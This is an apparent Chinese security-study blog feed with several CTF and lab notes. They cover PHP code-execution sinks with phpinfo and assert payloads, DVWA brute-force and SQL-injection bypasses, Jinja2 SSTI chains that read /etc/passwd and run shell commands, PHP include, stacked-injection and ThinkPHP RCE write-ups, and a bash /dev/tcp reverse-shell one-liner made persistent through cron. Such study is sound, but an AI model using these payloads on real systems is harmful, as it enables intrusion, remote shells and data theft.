<p>如果安全人员开启了GPC将无法绕过</p>
<p>因为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;会变成\&#x27;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在php5之前，magic_quotes_gpc默认开启，但是在php的cookies中，如果有单引号将会被反斜杠转义，现在差不多淘汰，一般使用stripslashes函数转义</span><br><span class="line">传入1&#x27;直接变成\&#x27;</span><br></pre></td></tr></table></figure>





<p>2、</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">preg_place</span><br><span class="line">存在危险修饰符/e</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">	preg_place(&quot;/abc/e&quot;,$_REQUEST[&#x27;cmd&#x27;],&quot;abc&quot;)</span><br><span class="line">?&gt;</span><br><span class="line">这里匹配到了abc可直接执行传入的内容。</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">	preg_place(&#x27;/&lt;data&gt;(.*)&lt;\/data&gt;/e&#x27;,&#x27;$ret=&quot;\\1&quot;;&#x27;,$cmd)//反斜杠转义/，说明是字符串的内容。</span><br><span class="line">	echo $ret;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">传入</span><br><span class="line">?cmd=&lt;data&gt;&#123;$&#123;phpinfo()&#125;&#125;&lt;/data&gt;</span><br></pre></td></tr></table></figure>



<p>3、自定义函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create_function主要用来创建匿名函数，如果没有严格对参数传递进行过滤，攻击者可构造特殊字符串传递给该函数执行任意命令。</span><br><span class="line">&lt;?php</span><br><span class="line">	$func=create_function(&#x27;&#x27;,$_REQUEST[&#x27;cmd&#x27;]);</span><br><span class="line">	$func();</span><br><span class="line">?&gt;</span><br><span class="line">第一个为参数，第二个为代码。</span><br></pre></td></tr></table></figure>



<p>4、动态函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	function a()&#123;</span><br><span class="line">	echo &#x27;a&#x27;;</span><br><span class="line">	&#125;</span><br><span class="line">	if(isset($_GET[&quot;func&quot;]))&#123;</span><br><span class="line">		$myfunc=$_GET[&quot;func&quot;]</span><br><span class="line">		$myfunc();</span><br><span class="line">	&#125;</span><br><span class="line">传入?func=phpinfo	</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">	$_GET[&#x27;a&#x27;]($_GET[&#x27;b&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line">传入</span><br><span class="line">?a=assert&amp;b=phpinfo()</span><br></pre></td></tr></table></figure>



<p>用户自定义函数回调</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call_user_func(&#x27;assert&#x27;,$_GET[&#x27;cmd&#x27;]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用is_callable函数来确定某函数是否可回调</span><br><span class="line">输出1表示可，没输出不可。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">传递数组类型</span><br><span class="line">&lt;?php</span><br><span class="line">	$cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">	$arrar[0]=$cmd;</span><br><span class="line">	call_user_func_array(&#x27;assert&#x27;,$array);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">如果代码没有转为数组，我们可以直接传入数组</span><br><span class="line"></span><br><span class="line">?cmd[]=phpinfo()</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">	$array1=array($cmd);</span><br><span class="line">	$func=$_GET[&#x27;func&#x27;];</span><br><span class="line">	array_filter($array,$func)</span><br><span class="line">?&gt;</span><br><span class="line">这个函数不同于上面，这里参数在前，函数在后。</span><br><span class="line"></span><br><span class="line">php5.6以上</span><br><span class="line">sort</span><br><span class="line">usort($_GET)</span><br><span class="line"></span><br><span class="line">?1[]=phpinfo()&amp;1[]=123&amp;2=assert()</span><br></pre></td></tr></table></figure>





<p>5、其他</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;php代码&#125;</span><br><span class="line">&lt;?php</span><br><span class="line">	$&#123;php代码&#125;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line">$func=$&#123;phpinfo()&#125;;</span><br><span class="line">$func();</span><br></pre></td></tr></table></figure>



]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Brute Force</title>
    <url>/2021/01/10/Force/</url>
    <content><![CDATA[<h3 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h3><p>即暴力（破解），是指黑客利用密码字典，使用穷举法猜解出用户口令，是现在最为广泛使用的攻击手法之一。</p>
<ul>
<li>low<br>查看源码，可以发现，服务器只是验证参数login是否设置，<br>isset函数在服务器中检测变量是否被设置，返回true/false，没有任何防爆机制，且存在sql注入。<br>方法一(sql注入)：在username框输入admin’# 或者 admin’ or ‘1’=’1即可成功登陆。<br>原理为 and的优先级高于or。<br>方法二(burp爆破)抓包下来，放到intruder爆破，只对参数password进行爆破，<br><img src="Force.md/1.png"><br>换到payload，再添加字典，最后开始attack。<br><img src="Force.md/2.png"><br>成功爆破，返回页面长度和其他不一样的。<br><img src="Force.md/3.png"></li>
<li>medium<br>可以看到，medium级别的代码对用户输入的参数进行了简单的过滤，对一些预定义字符进行了转义，基本上防止了SQL注入。<br>还有一个措施就是如果密码输错了，则延时两秒之后才能再次提交。<br>用burp爆破与low操作一样，只是少了sql注入。</li>
<li>high<br>使用了Anti-CSRF token来抵御CSRF攻击，使用了函数stripslashes和mysqli_real_esacpe_string来抵御sql注入和xss攻击。<br>由于使用了Anti-CSRF token，每次服务器返回登陆页面都会包含一个随机的user_token值，每次用户登陆要一起提交，<br>所以服务器接到请求，会先检查user_token值，再进行sql查询，所以使用不再使用burp的无脑爆破。<br>这里有两种方法：<br>方法一：写python脚本，先模拟服务器发出请求获得一个token值，再利用获得的token值进行爆破。(脚本后续补上)<br>方法二：还是可以使用burp爆破，需要修改一些设置。<br><img src="Force.md/4.png">参加两个爆破参数。<br>这里攻击类型也要相应修改，为pitchfock，线程设为1。<br>找到Grep-Extract模块进行相应设置，add：</li>
</ul>
]]></content>
      <tags>
        <tag>暴力破解</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux-基础知识</title>
    <url>/2021/05/25/Linux-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<h3 id="linux基础知识"><a href="#linux基础知识" class="headerlink" title="linux基础知识"></a>linux基础知识</h3><h4 id="linux反弹shell命令"><a href="#linux反弹shell命令" class="headerlink" title="linux反弹shell命令"></a>linux反弹shell命令</h4><p><strong>监听服务端</strong></p>
<p>使用netcat进行监听端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvp +端口号(可任意设置未使用位置)</span><br></pre></td></tr></table></figure>



<p><strong>反弹客户端</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i&gt;&amp;/dev/tcp/服务端ip地址/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-i  用户输入命令进行执行</span><br><span class="line"></span><br><span class="line">&gt;&amp;    将bash -i 交互执行结构 重定向(&gt;)并不做结果输出(&amp;)</span><br><span class="line"></span><br><span class="line">/dev/tcp/服务端ip地址/4444 基于TCP连接到 ip和端口位置</span><br><span class="line"></span><br><span class="line">0&gt;&gt;&amp;1    将获得输入重定向保存到输出中，这样监听端可获取输入与输出都显示的效果</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>执行完毕后不会进行任何输出，此时监听服务端得到反弹的shell连接。</p>
<p>此时获得反弹服务端的shell，可执行任意命令。但是一旦客户端关闭shell窗口，此时连接中断。为了可持久反弹，可用定时任务。</p>
<h4 id="linux定时任务"><a href="#linux定时任务" class="headerlink" title="linux定时任务"></a>linux定时任务</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用于设置Linux进行周期性执行某种任务等某些事件的操作。类似windows下</span><br><span class="line">的计划任务。</span><br></pre></td></tr></table></figure>



<p>在linux下可通过crontab进行计划任务的编写与浏览</p>
<p><strong>1、查看当前用户的定时任务</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crontab -l</span><br></pre></td></tr></table></figure>



<p><strong>2、编辑任务</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crontab -e</span><br><span class="line"></span><br><span class="line">*/1 * * * *+任务每分钟执行</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>也可以在/var/spool/cron目录下 新建用户自定义的文件(以用户名命名)，编写计划任务。</p>
<p>对于该命令是否执行，可通过/var/log/cron.log查看日志是否执行任务。</p>
<p>如果没有日志记录，可编辑/etc/rsyslog.conf，将cron前的注释去掉，同时使用命令重启服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service rsyslog restart</span><br></pre></td></tr></table></figure>













]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP基础</title>
    <url>/2020/11/06/PHP/</url>
    <content><![CDATA[<h3 id="基本的PHP语法"><a href="#基本的PHP语法" class="headerlink" title="基本的PHP语法"></a>基本的PHP语法</h3><?php
// PHP代码
?>


<h4 id="PHP中的注释"><a href="#PHP中的注释" class="headerlink" title="PHP中的注释"></a>PHP中的注释</h4><pre><code>  (与c语言相同)
</code></pre>
<h4 id="PHP变量"><a href="#PHP变量" class="headerlink" title="PHP变量"></a>PHP变量</h4><?php
$x=5;
$y=6;
$z=$x+$y;
echo $z;
?>


<h4 id="echo和print语句（注意这里的print与c语言的不同）"><a href="#echo和print语句（注意这里的print与c语言的不同）" class="headerlink" title="echo和print语句（注意这里的print与c语言的不同）"></a>echo和print语句（注意这里的print与c语言的不同）</h4><pre><code>  区别：echo-可以输出一个或多个字符串(记得加“ ”)
            print-只允许输出一个字符串，返回值总为1
</code></pre>
<p>**echo输出速度比print快，echo没有返回值，print返回值为1.<br>   echo/print 是一个语言结构，使用的时候可以不用加括号，也可以加上括号： echo 或 echo()</p>
<h4 id="PHP-EOF-heredoc-使用说明"><a href="#PHP-EOF-heredoc-使用说明" class="headerlink" title="PHP EOF(heredoc) 使用说明"></a>PHP EOF(heredoc) 使用说明</h4><pre><code> A.必须后接分号，否则编译通不过。
 B.EOF可以用其他任意字符代替，只需保证结束标识与开始标识一致。
 C.##结束标识必须顶格独自占一行（即必须从行首开始，前后不能衔接任何空白和字符）。 
</code></pre>
<p>eg：<br><?php
echo <<<EOF
               <h1>我的第一个标题</h1>
            <p>我的第一个段落。</p>
EOF;
?></p>
<p>***开始标记和结束标记相同，比如常用大写的 EOT、EOD、EOF 来表示，但是不只限于那几个(也可以用：JSON、HTML等)，只要保证开始标记和结束标记不在正文中出现即可。<br>***变量不需要用连接符 . 或 , 来拼接<br>*例echo txt1”.“txt2;</p>
<h4 id="PHP字符串"><a href="#PHP字符串" class="headerlink" title="PHP字符串"></a>PHP字符串</h4><pre><code>  你可以将任何文本放在单引号和双引号中
</code></pre>
<h4 id="PHP常量"><a href="#PHP常量" class="headerlink" title="PHP常量"></a>PHP常量</h4><pre><code> 常量是一个简单值的标识符。该值在脚本中不能改变。
 一个常量由英文字母、下划线和数字组成，但数字不能作为首字母出现。
</code></pre>
<p>注意：##常量在整个脚本中都可以使用。</p>
<h4 id="var-dump"><a href="#var-dump" class="headerlink" title="var_dump()"></a>var_dump()</h4><p>判断一个变量的类型与长度，并输出变量的数值，如果变量有值，则输出是变量的值，并返回数据类型。<br>显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。</p>
<h4 id="PHP类型比较"><a href="#PHP类型比较" class="headerlink" title="PHP类型比较"></a>PHP类型比较</h4><p>松散比较：使用两个等号 == 比较，只比较值，不比较类型。<br>严格比较：用三个等号 === 比较，除了比较值，也比较类型。</p>
<h4 id="PHP字符串变量"><a href="#PHP字符串变量" class="headerlink" title="PHP字符串变量"></a>PHP字符串变量</h4><p>字符串变量用于包含有字符的值。<br>注释：当您赋一个文本值给变量时，请记得给文本值加上单引号或者双引号。</p>
<h4 id="PHP-并置运算符"><a href="#PHP-并置运算符" class="headerlink" title="PHP 并置运算符"></a>PHP 并置运算符</h4><p>在 PHP 中，只有一个字符串运算符。<br>并置运算符 (.) 用于把两个字符串值连接起来。</p>
<h4 id="PHP-strlen-函数"><a href="#PHP-strlen-函数" class="headerlink" title="PHP strlen() 函数"></a>PHP strlen() 函数</h4><p>有时知道字符串值的长度是很有用的。<br>strlen() 函数返回字符串的长度（字节数）。eg：echo strlen（）输出括号内的字符串长度</p>
<h4 id="PHP-strpos-函数"><a href="#PHP-strpos-函数" class="headerlink" title="PHP strpos() 函数"></a>PHP strpos() 函数</h4><p>strpos() 函数用于在字符串内查找一个字符或一段指定的文本。<br>如果在字符串中找到匹配，该函数会返回第一个匹配的字符位置。如果未找到匹配，则返回 FALSE。<br>**提示：字符串中第一个字符的位置是 0，而不是 1。</p>
]]></content>
  </entry>
  <entry>
    <title>SSTI注入</title>
    <url>/2021/03/13/SSTI%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h2 id="SSTI注入"><a href="#SSTI注入" class="headerlink" title="SSTI注入"></a>SSTI注入</h2><p><em>又称服务器端模板注入攻击，和sql注入类似，也是用户输入而造成的安全问题。</em></p>
<p><em>下面是基于python脚本编写的SSTI漏洞。</em></p>
<p>模板引擎的作用：实现php代码和html代码分离。</p>
<p><em><strong>原理：</strong></em></p>
<p><em><strong>服务器接收了用户的输入，没有对输入的代码过滤或过滤不完全，将用户输入作为web应用模板的一部分，在进行编译渲染的过程中，执行了用户输入的恶意代码，造成信息泄露等等。。。</strong></em></p>
<p><strong>flask中渲染的方法有两种:</strong></p>
<p><strong>render_template 渲染文件</strong></p>
<p><strong>render_template_string 渲染字符串</strong></p>
<p><strong>不正确使用render_template_string会导致SSTI</strong></p>
<p><em><strong>了解一下python的基本知识：</strong></em></p>
<p><em><strong><code>__class__   //返回类型所属的对象</code></strong></em></p>
<p><em><strong><code>__mro__   //返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析</code></strong></em></p>
<p><em><strong><code>__base__   //返回该对象所继承的基类</code></strong></em></p>
<p><em><strong><code>//base和mro都是用来寻找基类的</code></strong></em></p>
<p><em><strong><code>__subclasses__   //每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的引用的列表。</code></strong></em></p>
<p><em><strong><code>__init__ 类的初始化方法</code></strong></em></p>
<p><em><strong><code>__globals__: 对包含函数全局变量的字典的引用</code></strong></em></p>
<h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><p>在 CTF 中，最常见的也就是 Jinja2 的 SSTI 漏洞了。</p>
<h4 id="获取基本类"><a href="#获取基本类" class="headerlink" title="获取基本类"></a>获取基本类</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__mro__[2]</span><br><span class="line"></span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line"></span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line"></span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line"></span><br><span class="line">request.__class__.mro__[8]//针对jinjia2/flask为[9]适用</span><br></pre></td></tr></table></figure>

<h4 id="获取基本类-object-的子类"><a href="#获取基本类-object-的子类" class="headerlink" title="获取基本类(object)的子类"></a>获取基本类(object)的子类</h4><p><code>object.__subclasses__()</code></p>
<p><code>&#39;&#39;.__class__.__mro__[2].__subclasses()</code></p>
<h4 id="找到重载过的-init-类（在获取初始化属性后，带wrapper的说明没有重载，寻找不带warpper的"><a href="#找到重载过的-init-类（在获取初始化属性后，带wrapper的说明没有重载，寻找不带warpper的" class="headerlink" title="找到重载过的__init__类（在获取初始化属性后，带wrapper的说明没有重载，寻找不带warpper的)"></a>找到重载过的__init__类（在获取初始化属性后，带wrapper的说明没有重载，寻找不带warpper的)</h4><p><code>&#39;&#39;.__class__.__mro__.__subclasses__()[xx].__init__</code></p>
<h4 id="查看其引用-builtins"><a href="#查看其引用-builtins" class="headerlink" title="查看其引用_builtins_"></a>查看其引用_<em>builtins</em>_</h4><p>builtins即为引用，python一旦启动，就会在程序员所写的代码没有运行就被加载到内存中，builtins不用导入，在任何模块都有，所以直接引用。</p>
<p><code>&#39;&#39;.__class__.__mor__[2].__subclasses__()[xx].__init__.__globals__[&#39;__builtins__&#39;]</code></p>
<h4 id="这里会返回dict类型，寻找keys中可用函数，直接调用即可，使用keys中的file以实现读取文件的功能"><a href="#这里会返回dict类型，寻找keys中可用函数，直接调用即可，使用keys中的file以实现读取文件的功能" class="headerlink" title="这里会返回dict类型，寻找keys中可用函数，直接调用即可，使用keys中的file以实现读取文件的功能"></a>这里会返回dict类型，寻找keys中可用函数，直接调用即可，使用keys中的file以实现读取文件的功能</h4><p><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;x://Flag.txt&#39;).read()</code></p>
<h3 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h3><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;/etc/passwd&#39;).read()  #将read() 修改为 write() 即为写文件</code></p>
<h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>存在的子模块可以通过.index()来进行查询，如果存在的话返回索引，直接调用即可</p>
<p><code>&#39;&#39;.__class__.__mro__[2].__subclasses__().index(file)</code>如返回xx</p>
<p><code>[].__class__.__base__.__subclasses__()[xx](&#39;/etc/passwd&#39;).read() #将read() 修改为 write() 即为写文件</code></p>
<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><h4 id="利用eval进行命令执行"><a href="#利用eval进行命令执行" class="headerlink" title="利用eval进行命令执行"></a>利用eval进行命令执行</h4><p><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#39;)</code></p>
<h4 id="利用warnings-catch-warnings进行命令执行"><a href="#利用warnings-catch-warnings进行命令执行" class="headerlink" title="利用warnings.catch_warnings进行命令执行"></a>利用warnings.catch_warnings进行命令执行</h4><p><code>[].__class__.__base__.__subclasses__().index(warning.catch_warnings)</code></p>
<p>返回a</p>
<p>查看linecache位置</p>
<p><code>[].__class__.base__.__subclasses__()[a].__init__.__globals__.keys.index(&#39;linecache&#39;)</code></p>
<p>返回b</p>
<p>查找os模块的位置</p>
<p><code>[].__class__.__base__.__subclasses__()[a].__init__.globals__[&#39;linecache&#39;].__dict__.keys().index(&#39;os&#39;)</code></p>
<p>返回c</p>
<p>查找system方法的位置</p>
<p><code>[].__class__.__base__.__subclasses__()[a].__init__.__globals__[&#39;linecache&#39;].__dict__.values()[c].__dict__.keys().index(&#39;system&#39;)</code></p>
<p>返回d</p>
<p>调用system方法</p>
<p><code>[].__class__.__base__.__subclasses__()[a].__init__.__globals__[&#39;linecache&#39;].__dict__.values()[c].__dict__.values()[d](&#39;whoami&#39;)</code></p>
<h4 id="利用commands进行命令执行"><a href="#利用commands进行命令执行" class="headerlink" title="利用commands进行命令执行"></a>利用commands进行命令执行</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#125;.__class__.__bases__[0].__subclasses__()[xx].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;commands&#x27;).getstatusoutput(&#x27;ls&#x27;)</span><br><span class="line"></span><br><span class="line">&#123;&#125;.__class__.__bases__[0].__subclasses__()[xx].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).system(&#x27;ls&#x27;)</span><br><span class="line"></span><br><span class="line">&#123;&#125;.__class__.__bases__[0].__subclasses__()[xx].__init__.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;flag&#x27;).read()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>参考：<a href="https://www.yuque.com/jxswcy/ctfnotebook/tdxk3n">https://www.yuque.com/jxswcy/ctfnotebook/tdxk3n</a></p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP2</title>
    <url>/2020/11/10/PHP2/</url>
    <content><![CDATA[<h3 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h3><p>for （初始值；条件；增量）<br>{要执行的代码<br>}<br>eg：1+2+。。+100值<br><code>for （$i=0;$i&lt;=100;$i++）</code><br><code>&#123;$sum+=$i; </code><br><code>&#125;echo &quot;$sum&quot;</code></p>
<h3 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h3><p><code>while (条件)</code><br><code>&#123;要执行的代码;&#125;</code>
    </p>
]]></content>
  </entry>
  <entry>
    <title>攻防世界进阶</title>
    <url>/2021/03/23/advanced/</url>
    <content><![CDATA[<h3 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a>baby_web</h3><p>想想初始页面是哪个。</p>
<p>我们首先想到index.php，访问。</p>
<p>点击网络，在消息头中找到flag。</p>
<h3 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h3><p>送分题，翻译一下那段话，介绍了robots.txt协议，搜索引擎中访问网站的时候要查看的第一个文件，</p>
<p>我们访问一下就发现了flag的位置跟新手练习区的robots一样。</p>
<h3 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h3><p><em><strong>原理：ThinkPHP5框架底层对控制器名过滤不严，可以通过url调用到ThinkPHP框架内部的敏感函数，进而导致getshell漏洞。</strong></em></p>
<p>这题的漏洞是关于ThinkPHP V5，随便百度一下拿一下payload，即可执行我们想要的操作。(这里也告诉我们相关比较明显提示的漏洞我们可以直接百度)</p>
<p><img src="advanced.md/1.png"></p>
<p>命令执行成功，查找flag位置。</p>
<p><img src="advanced.md/2.png"></p>
<p>最后查看flag内容。</p>
<p><img src="advanced.md/3.png"></p>
<h3 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h3><p>类型：文件包含漏洞<br>echo：输出用户想查询的信息，所以往后拼接hello，？：拼接符</p>
<h4 id="方法一：page进行传参数，绕过while，执行其他语句，利用提交参数进行拼接，然后利用system函数进行LS查看。"><a href="#方法一：page进行传参数，绕过while，执行其他语句，利用提交参数进行拼接，然后利用system函数进行LS查看。" class="headerlink" title="方法一：page进行传参数，绕过while，执行其他语句，利用提交参数进行拼接，然后利用system函数进行LS查看。"></a>方法一：page进行传参数，绕过while，执行其他语句，利用提交参数进行拼接，然后利用system函数进行LS查看。</h4><p><code>?page=http://127.0.0.1/index.php/?hello=&lt;?system(%22ls%22);?&gt;</code><br>index.php主页面,<br><img src="advanced.md/4.png"><br>show_source:展示其他PHP网页信息。<br><code>?page=http://127.0.0.1/index.php/?hello=&lt;?show_source(&quot;fl4gisisish3r3.php&quot;);?&gt;</code>记得加引号。<br>得到flag。</p>
<h4 id="方法二：php伪协议"><a href="#方法二：php伪协议" class="headerlink" title="方法二：php伪协议"></a>方法二：php伪协议</h4><p>利用system函数获取的所有能够显示的文件内容，都是被浏览器进行了base64加密，不会显示在主页面上。<br>方法：?page=php://input    POST提交<?php php代码?><br>php://在使用时存在大小写区别，可大小写绕过。</p>
<p>这里使用hackbar一直提交失败，使用burp才成功了。</p>
<p><img src="advanced.md/5.png"></p>
<h4 id="方法三：封装协议-data"><a href="#方法三：封装协议-data" class="headerlink" title="方法三：封装协议-data://"></a>方法三：封装协议-data://</h4><p>区别在于用get提交<br><code>?page=data://text/plain,&lt;?php system(&#39;ls&#39;);?&gt;</code></p>
<p><img src="advanced.md/6.png"></p>
<h3 id="supersqli"><a href="#supersqli" class="headerlink" title="supersqli"></a>supersqli</h3><p>题目描述：随便注，来自强网杯2019</p>
<p>一看就是sql注入题目。</p>
<p>首先判断一下注入类型</p>
<p>为字符型，单引号。</p>
<p>判断字段数</p>
<p><img src="advanced.md/7.png"></p>
<p>3报错，2正常回显，所以字段数为2。</p>
<p>直接开始联合查询注入，</p>
<p><img src="advanced.md/8.png"></p>
<p>有一个正则表达式，把联合注入语句部分代码过滤了，这里我们试一下堆叠注入。</p>
<p><img src="advanced.md/9.png">可以爆出数据，</p>
<p>也可以爆出表。</p>
<p><img src="advanced.md/10.png"></p>
<p>有两个表，这里不需要选择表，应该默认指定数据库，但是可以猜出数据库就是supersql，再加from supersql 果然这两个表属于supersql。</p>
<p>查询一下两个表名的字段，</p>
<p><img src="advanced.md/11.png"></p>
<p><img src="advanced.md/12.png"></p>
<p><strong>记得字符串为表名操作时记得加反引号</strong></p>
<p>观察两个表的字段，可以知道words表是默认查询的表，传入inject参数的值也就是赋值给了id。</p>
<p>所以我们可以修改数字表名为words表名，再修改flag为id这个字段，即可查询flag值，尝试一下。</p>
<p>使用rename修改表名，再使用alter修改字段名，这里记得要先把原来的words表名修改，不然修改不了。</p>
<p>语法：</p>
<p><em><strong>修改表名</strong></em></p>
<p><em><strong>rename table 表名1 to 表名2</strong></em></p>
<p><em><strong>修改字段名</strong></em></p>
<p><em><strong>alter table 表名 change 字段名1 字段名2 数据类型。</strong></em></p>
<p><img src="advanced.md/13.png"></p>
<p>输入1’ or ‘1’=’1 获得flag。</p>
<p><img src="advanced.md/14.png"></p>
<p>本题要一气呵成，如果分开写，后面会报错，导致无法执行我们想要执行的代码。</p>
<h3 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a>ics-06</h3><p>发现url有个id值，想了半天不知道怎么弄，直接爆破id值结果就出来了。</p>
<h3 id="Warm-up-代码审计"><a href="#Warm-up-代码审计" class="headerlink" title="Warm up(代码审计)"></a>Warm up(代码审计)</h3><p>先F12查看源码，看到注释source.php，<br><img src="advanced.md/4.png"><br>访问一下，页面出现源码，</p>
<p><img src="advanced.md/15.png"></p>
<p>发现一个hint.php先访问，<br><img src="advanced.md/16.png">发现flag在ffffllllaaaagggg里(暗示要访问四层目录)。再回去审查代码，<br>可以看到最后的include 是可以动态构造参数的，那应该就是解题关键了。<br>不过要经过三个判断</p>
<p>第一个：检查一个变量是否为空</p>
<p>第二个：是否为字符串</p>
<p>第三个：通过函数来检查</p>
<p>我们要构造的payload本身就满足前两点所以无视</p>
<p>重要是第三点的这个函数</p>
<p>函数作用是分三步检查传进来的参数是否满足白名单：</p>
<p>$whitelist = [“source”=&gt;”source.php”,”hint”=&gt;”hint.php”];</p>
<p>$_REQUEST 是通过 GET，POST 和 COOKIE 输入机制来传递参数，这里通过get传参。</p>
<p>后面就是构造payload，访问多个目录，得到flag</p>
<p><img src="advanced.md/17.png"></p>
<h3 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h3><p>这是一题简单sql注入题，不存在任何过滤。</p>
<p>方法一：手工注入</p>
<p><img src="advanced/19.png"></p>
<p>上传了爆表的，其它的类似。。。(记得把前面置空，不然查询的不是我们想要的结果)</p>
<p>方法二 sqlmap爆破</p>
<p><img src="advanced/20.png"></p>
<p>记得数据要加””,这种方式是通过post提交。</p>
<h3 id="NaNNaNNaNNaN-Batman"><a href="#NaNNaNNaNNaN-Batman" class="headerlink" title="NaNNaNNaNNaN-Batman"></a>NaNNaNNaNNaN-Batman</h3><p>下载文件，通过浏览器方式打开，有一个post提交的，但是输入什么都无反应，</p>
<p>再用记事本打开是一段js代码(乱码了)，发现代码末尾有一个函数eval，修改成alert即可弹出正常代码。(文件保存格式要.html格式)</p>
<p><img src="advanced/21.png"></p>
<p>审计一下代码，大概看得懂，因为没学过js代码，想把它转成python代码运行，其实没必要，在控制台即可输入js代码，得到结果。</p>
<p><img src="advanced/22.png"></p>
<p>PHP in_array() 函数<br>in_array() 函数搜索数组中是否存在指定的值。<br>注释：如果 search 参数是字符串且 type 参数被设置为 TRUE，则搜索区分大小写。<br>in_array(search,array,type)<br>1.函数mb_substr(a,m,n)：截取a字符串第m位到第n位的内容并返回<br>2.函数mb_strpos(b,x)：获取b字符串中，x字符/字符串第一次出现的位置<br>3.include目录穿越：include会把第一个/后面的路径作为访问路径来寻找文件<br>解密：逆向加法运算，base64解密，python脚本：<br>import base64<br>def python_decode(string):<br>    zimu = “abcdefghijklmnopqrstuvwxyz”<br>    rot_13 =””<br>    for i in string:<br>        if i.isdigit():<br>            rot_13 += i<br>        else:<br>            try:<br>                rot_13 += zimu[zimu.index(i)-13]<br>            except:<br>                rot_13 += zimu[zimu.index(i.lower())-13].upper()<br>    fz = rot_13[::-1]<br>    base = base64.b64decode(fz)<br>    base = [chr(ord(i)-1) for i in base]<br>    fz = base[::-1]<br>    print “”.join(fz)</p>
<p>python_decode(“a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws”)</p>
<p>​    </p>
]]></content>
  </entry>
  <entry>
    <title>cs</title>
    <url>/2021/01/25/cs/</url>
